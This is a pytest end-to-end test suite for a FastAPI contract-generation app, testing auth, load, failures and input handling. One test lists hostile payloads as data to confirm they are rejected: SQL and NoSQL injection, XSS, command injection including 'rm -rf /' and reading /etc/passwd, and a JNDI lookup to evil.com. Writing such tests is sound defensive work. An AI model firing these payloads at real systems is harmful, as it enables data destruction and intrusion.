"""
End-to-End tests for edge cases and error scenarios
Testing MVP requirements under stress, failure conditions, and edge cases
"""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, AsyncMock, Mock
import json
import time
import concurrent.futures
from threading import Thread

from app.main import app


class TestEdgeCasesAndErrorScenarios:
    """E2E tests for edge cases, error handling, and stress scenarios"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    def test_concurrent_contract_generation(self, client):
        """
        Test concurrent contract generation by multiple users
        Edge Case: System load and race conditions
        """
        # Register multiple users
        users = []
        for i in range(3):
            user_data = {
                "email": f"concurrent{i}@test.com",
                "password": "ConcurrentPass123!",
                "full_name": f"Concurrent User {i}",
                "company": {
                    "name": f"Concurrent Corp {i}",
                    "registration_number": f"1234567{i}",
                    "address": f"{i} Test St, London, UK"
                }
            }
            
            response = client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code == 200
            
            token = response.json()["access_token"]
            users.append({
                "email": user_data["email"],
                "token": token,
                "headers": {"Authorization": f"Bearer {token}"}
            })
        
        with patch('app.api.v1.endpoints.contracts.ai_service') as mock_ai_service:
            # Mock AI service with varying response times
            def mock_generate(contract_type, plain_english_input, **kwargs):
                import asyncio
                import random
                
                # Simulate varying processing times
                processing_time = random.randint(1000, 3000)
                
                return asyncio.coroutine(lambda: (
                    f"CONCURRENT CONTRACT FOR {contract_type.upper()}",
                    {
                        "model_used": "llama3-70b-8192",
                        "processing_time_ms": processing_time,
                        "confidence_score": 0.90
                    }
                ))()
            
            def mock_compliance(**kwargs):
                return asyncio.coroutine(lambda: {
                    "overall_score": 0.95,
                    "gdpr_compliance": 0.96,
                    "risk_score": 3,
                    "risk_factors": ["Standard terms"],
                    "recommendations": ["Review clauses"]
                })()
            
            mock_ai_service.generate_contract = AsyncMock(side_effect=mock_generate)
            mock_ai_service.validate_contract_compliance = AsyncMock(side_effect=mock_compliance)
            
            # Generate contracts concurrently
            def generate_contract_for_user(user, contract_index):
                contract_request = {
                    "title": f"Concurrent Contract {contract_index} for {user['email']}",
                    "contract_type": "service_agreement",
                    "plain_english_input": f"Concurrent contract generation test {contract_index}",
                    "compliance_level": "standard"
                }
                
                response = client.post(
                    "/api/v1/contracts/generate",
                    json=contract_request,
                    headers=user["headers"]
                )
                
                return response
            
            # Use ThreadPoolExecutor for concurrent requests
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                
                # Submit multiple contract generation requests
                for user in users:
                    for contract_index in range(2):  # 2 contracts per user
                        future = executor.submit(generate_contract_for_user, user, contract_index)
                        futures.append(future)
                
                # Collect results
                results = []
                for future in concurrent.futures.as_completed(futures, timeout=30):
                    response = future.result()
                    results.append(response)
            
            # Verify all requests succeeded
            for response in results:
                assert response.status_code == 200
                data = response.json()
                assert "contract" in data
                assert "CONCURRENT CONTRACT" in data["contract"]["generated_content"]
    
    def test_invalid_authentication_tokens(self, client):
        """
        Test various invalid authentication scenarios
        Edge Case: Security vulnerabilities and token manipulation
        """
        invalid_tokens = [
            "",  # Empty token
            "Bearer ",  # Bearer with no token
            "Bearer invalid",  # Invalid token format
            "Basic dGVzdDp0ZXN0",  # Wrong auth type
            "Bearer " + "a" * 1000,  # Extremely long token
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",  # Malformed JWT
            None  # No authorization header
        ]
        
        protected_endpoints = [
            ("/api/v1/auth/me", "GET"),
            ("/api/v1/contracts/", "GET"),
            ("/api/v1/contracts/generate", "POST"),
            ("/api/v1/ai/analyze-contract", "POST")
        ]
        
        for token in invalid_tokens:
            for endpoint, method in protected_endpoints:
                headers = {}
                if token is not None:
                    headers["Authorization"] = token if token.startswith("Bearer") or token.startswith("Basic") else f"Bearer {token}"
                
                if method == "GET":
                    response = client.get(endpoint, headers=headers)
                else:
                    response = client.post(endpoint, json={}, headers=headers)
                
                # Should return 401 Unauthorized or 422 Validation Error
                assert response.status_code in [401, 422]
    
    def test_extreme_input_sizes(self, client):
        """
        Test system behavior with extreme input sizes
        Edge Case: Buffer overflows, memory limits, DoS protection
        """
        # Register a test user
        user_data = {
            "email": "extreme@test.com",
            "password": "ExtremePass123!",
            "full_name": "Extreme Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Test extremely long contract inputs
        extreme_inputs = [
            {
                "name": "very_long_title",
                "data": {
                    "title": "A" * 1000,  # Very long title
                    "contract_type": "service_agreement",
                    "plain_english_input": "Standard input"
                }
            },
            {
                "name": "very_long_input",
                "data": {
                    "title": "Standard Title",
                    "contract_type": "service_agreement", 
                    "plain_english_input": "This is a test. " * 1000  # Very long input (50k chars)
                }
            },
            {
                "name": "empty_strings",
                "data": {
                    "title": "",  # Empty title
                    "contract_type": "service_agreement",
                    "plain_english_input": ""  # Empty input
                }
            },
            {
                "name": "unicode_and_special_chars",
                "data": {
                    "title": "Contract with émojis 🎉 and ünïcödé",
                    "contract_type": "service_agreement",
                    "plain_english_input": "Special chars: <script>alert('xss')</script> & SQL'; DROP TABLE contracts;-- and unicode: 中文测试"
                }
            }
        ]
        
        for test_case in extreme_inputs:
            response = client.post(
                "/api/v1/contracts/generate",
                json=test_case["data"],
                headers=auth_headers
            )
            
            # System should handle gracefully - either success or proper error
            assert response.status_code in [200, 400, 422, 500]
            
            if response.status_code != 200:
                error_data = response.json()
                assert "detail" in error_data
                # Error message should not expose internal system details
                assert "Traceback" not in str(error_data)
                assert "Exception" not in str(error_data).split(":")[-1]
    
    def test_ai_service_failures_and_fallbacks(self, client):
        """
        Test AI service failure scenarios and graceful degradation
        Edge Case: External service failures, network issues, rate limits
        """
        user_data = {
            "email": "ai_failure@test.com",
            "password": "AIFailurePass123!",
            "full_name": "AI Failure Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        failure_scenarios = [
            {
                "name": "timeout_error",
                "exception": asyncio.TimeoutError("Request timed out")
            },
            {
                "name": "connection_error", 
                "exception": ConnectionError("Unable to connect to AI service")
            },
            {
                "name": "rate_limit_error",
                "exception": Exception("Rate limit exceeded")
            },
            {
                "name": "invalid_api_key",
                "exception": Exception("Invalid API key")
            },
            {
                "name": "service_unavailable",
                "exception": Exception("Service temporarily unavailable")
            }
        ]
        
        for scenario in failure_scenarios:
            with patch('app.api.v1.endpoints.contracts.ai_service') as mock_ai_service:
                mock_ai_service.generate_contract = AsyncMock(
                    side_effect=scenario["exception"]
                )
                
                contract_request = {
                    "title": f"Test Contract for {scenario['name']}",
                    "contract_type": "service_agreement",
                    "plain_english_input": "Test contract for AI failure scenario",
                    "compliance_level": "standard"
                }
                
                response = client.post(
                    "/api/v1/contracts/generate",
                    json=contract_request,
                    headers=auth_headers
                )
                
                # Should return 500 with proper error message
                assert response.status_code == 500
                error_data = response.json()
                assert "Contract generation failed" in error_data["detail"]
                
                # Error should not expose sensitive information
                assert "api_key" not in error_data["detail"].lower()
                assert "password" not in error_data["detail"].lower()
    
    def test_database_constraint_violations(self, client):
        """
        Test database constraint violations and data integrity
        Edge Case: Concurrent updates, data consistency, constraint violations
        """
        # Test duplicate email registration
        user_data = {
            "email": "duplicate@test.com",
            "password": "DuplicatePass123!",
            "full_name": "Duplicate Test User"
        }
        
        # First registration should succeed
        response1 = client.post("/api/v1/auth/register", json=user_data)
        assert response1.status_code == 200
        
        # Second registration with same email should fail
        response2 = client.post("/api/v1/auth/register", json=user_data)
        assert response2.status_code == 400
        assert "already exists" in response2.json()["detail"]
        
        # Test invalid foreign key references
        auth_headers = {"Authorization": f"Bearer {response1.json()['access_token']}"}
        
        # Try to access non-existent contract
        response = client.get("/api/v1/contracts/non-existent-contract-id", headers=auth_headers)
        # Should handle gracefully (currently returns mock data, but shouldn't crash)
        assert response.status_code in [200, 404]
    
    def test_memory_and_resource_limits(self, client):
        """
        Test system behavior under memory and resource constraints
        Edge Case: Memory leaks, resource exhaustion, DoS protection
        """
        user_data = {
            "email": "memory@test.com",
            "password": "MemoryPass123!",
            "full_name": "Memory Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Test large number of rapid requests
        def make_request():
            return client.get("/api/v1/contracts/", headers=auth_headers)
        
        # Make 50 rapid requests
        responses = []
        for i in range(50):
            response = make_request()
            responses.append(response)
        
        # Most requests should succeed (rate limiting may kick in)
        success_count = sum(1 for r in responses if r.status_code == 200)
        assert success_count >= 40  # At least 80% should succeed
        
        # System should remain responsive
        final_response = client.get("/api/v1/status")
        assert final_response.status_code == 200
    
    def test_malicious_input_injection(self, client):
        """
        Test protection against injection attacks
        Edge Case: SQL injection, XSS, command injection, template injection
        """
        user_data = {
            "email": "malicious@test.com",
            "password": "MaliciousPass123!",
            "full_name": "Malicious Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        malicious_inputs = [
            # SQL Injection attempts
            "'; DROP TABLE contracts; --",
            "' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --",
            
            # XSS attempts
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            
            # Command injection attempts
            "; cat /etc/passwd",
            "| whoami",
            "&& rm -rf /",
            
            # Template injection attempts
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "<%=7*7%>",
            
            # Path traversal
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            
            # Header injection
            "test\r\nX-Injected-Header: injected",
            
            # LDAP injection
            "*)(uid=*",
            "admin*",
            
            # NoSQL injection
            "'; return db.users.find(); var dummy='",
        ]
        
        for malicious_input in malicious_inputs:
            # Test in contract generation
            contract_request = {
                "title": malicious_input,
                "contract_type": "service_agreement",
                "plain_english_input": malicious_input,
                "compliance_level": "standard"
            }
            
            response = client.post(
                "/api/v1/contracts/generate",
                json=contract_request,
                headers=auth_headers
            )
            
            # System should either process safely or reject with proper error
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                # If processed, output should be sanitized
                data = response.json()
                contract_content = data.get("contract", {}).get("generated_content", "")
                
                # Should not contain raw malicious input
                assert "<script>" not in contract_content
                assert "DROP TABLE" not in contract_content
                assert "rm -rf" not in contract_content
    
    def test_network_and_connectivity_issues(self, client):
        """
        Test handling of network issues and external service problems
        Edge Case: Intermittent connectivity, partial responses, timeouts
        """
        user_data = {
            "email": "network@test.com",
            "password": "NetworkPass123!",
            "full_name": "Network Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Test partial AI responses
        with patch('app.api.v1.endpoints.contracts.ai_service') as mock_ai_service:
            # Simulate partial response
            mock_response = Mock()
            mock_response.choices = []  # Empty choices
            
            mock_ai_service.generate_contract = AsyncMock(
                side_effect=Exception("Incomplete response from AI service")
            )
            
            contract_request = {
                "title": "Network Test Contract",
                "contract_type": "service_agreement",
                "plain_english_input": "Test for network issues",
                "compliance_level": "standard"
            }
            
            response = client.post(
                "/api/v1/contracts/generate",
                json=contract_request,
                headers=auth_headers
            )
            
            assert response.status_code == 500
            error_data = response.json()
            assert "Contract generation failed" in error_data["detail"]
    
    def test_data_validation_edge_cases(self, client):
        """
        Test edge cases in data validation
        Edge Case: Boundary values, format validation, encoding issues
        """
        validation_test_cases = [
            {
                "name": "boundary_string_lengths",
                "data": {
                    "title": "A" * 255,  # Exactly at typical varchar limit
                    "contract_type": "service_agreement",
                    "plain_english_input": "B" * 5000  # At upper limit
                }
            },
            {
                "name": "unicode_normalization",
                "data": {
                    "title": "Café naïve résumé",  # Unicode chars
                    "contract_type": "service_agreement",
                    "plain_english_input": "Testing unicode: ñáéíóú çñü"
                }
            },
            {
                "name": "null_bytes",
                "data": {
                    "title": "Test\x00Contract",  # Null byte
                    "contract_type": "service_agreement",
                    "plain_english_input": "Contract with null\x00byte"
                }
            },
            {
                "name": "control_characters",
                "data": {
                    "title": "Test\r\n\tContract",  # Control chars
                    "contract_type": "service_agreement", 
                    "plain_english_input": "Contract with\bcontrol\fcharacters"
                }
            },
            {
                "name": "leading_trailing_spaces",
                "data": {
                    "title": "   Spaced Contract   ",
                    "contract_type": "service_agreement",
                    "plain_english_input": "   Spaced input   "
                }
            }
        ]
        
        # Register user for testing
        user_data = {
            "email": "validation@test.com",
            "password": "ValidationPass123!",
            "full_name": "Validation Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        for test_case in validation_test_cases:
            response = client.post(
                "/api/v1/contracts/generate",
                json=test_case["data"],
                headers=auth_headers
            )
            
            # Should handle gracefully
            assert response.status_code in [200, 400, 422]
            
            if response.status_code not in [200]:
                error_data = response.json()
                # Error messages should be helpful but not expose internals
                assert "detail" in error_data
                assert len(error_data["detail"]) > 0
    
    def test_subscription_and_rate_limits(self, client):
        """
        Test subscription limits and rate limiting behavior
        Edge Case: Quota exceeded, rate limiting, fair usage
        """
        # Test free tier user approaching limits
        free_user_data = {
            "email": "freelimit@test.com",
            "password": "FreeLimitPass123!",
            "full_name": "Free Limit User",
            "company": {
                "name": "Free Tier Company",
                "registration_number": "99999999"
            }
        }
        
        response = client.post("/api/v1/auth/register", json=free_user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Verify subscription tier
        company_response = client.get("/api/v1/auth/company", headers=auth_headers)
        assert company_response.status_code == 200
        company_data = company_response.json()
        assert company_data["subscription_tier"] == "free_trial"
        
        # Test user limits (MVP: 5 users per account)
        users_response = client.get("/api/v1/auth/company/users", headers=auth_headers)
        assert users_response.status_code == 200
        users_data = users_response.json()
        assert users_data["max_users"] == 5  # MVP requirement
    
    def test_concurrent_user_operations(self, client):
        """
        Test concurrent operations by the same user
        Edge Case: Race conditions, session management, data consistency
        """
        user_data = {
            "email": "concurrent_ops@test.com",
            "password": "ConcurrentOps123!",
            "full_name": "Concurrent Ops User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Simulate concurrent operations with the same user token
        def concurrent_operation(operation_id):
            if operation_id % 2 == 0:
                # List contracts
                return client.get("/api/v1/contracts/", headers=auth_headers)
            else:
                # Get user profile
                return client.get("/api/v1/auth/me", headers=auth_headers)
        
        # Execute operations concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(concurrent_operation, i) for i in range(20)]
            
            results = []
            for future in concurrent.futures.as_completed(futures, timeout=30):
                response = future.result()
                results.append(response)
        
        # All operations should succeed
        success_count = sum(1 for r in results if r.status_code == 200)
        assert success_count == 20  # All should succeed
    
    def test_system_recovery_and_resilience(self, client):
        """
        Test system recovery from various failure modes
        Edge Case: Graceful degradation, error recovery, system resilience
        """
        user_data = {
            "email": "recovery@test.com",
            "password": "RecoveryPass123!",
            "full_name": "Recovery Test User"
        }
        
        response = client.post("/api/v1/auth/register", json=user_data)
        auth_headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        
        # Test system remains functional after errors
        failure_sequences = [
            # Sequence 1: Invalid request followed by valid request
            [
                {
                    "endpoint": "/api/v1/contracts/generate",
                    "method": "POST",
                    "data": {"invalid": "data"},
                    "expected_status": 422
                },
                {
                    "endpoint": "/api/v1/contracts/",
                    "method": "GET", 
                    "data": None,
                    "expected_status": 200
                }
            ],
            # Sequence 2: Large request followed by normal request
            [
                {
                    "endpoint": "/api/v1/contracts/generate",
                    "method": "POST",
                    "data": {
                        "title": "A" * 1000,
                        "contract_type": "service_agreement",
                        "plain_english_input": "B" * 10000
                    },
                    "expected_status": [200, 400, 422]
                },
                {
                    "endpoint": "/api/v1/auth/me",
                    "method": "GET",
                    "data": None,
                    "expected_status": 200
                }
            ]
        ]
        
        for sequence in failure_sequences:
            for request_spec in sequence:
                if request_spec["method"] == "GET":
                    response = client.get(request_spec["endpoint"], headers=auth_headers)
                else:
                    response = client.post(
                        request_spec["endpoint"],
                        json=request_spec["data"],
                        headers=auth_headers
                    )
                
                expected = request_spec["expected_status"]
                if isinstance(expected, list):
                    assert response.status_code in expected
                else:
                    assert response.status_code == expected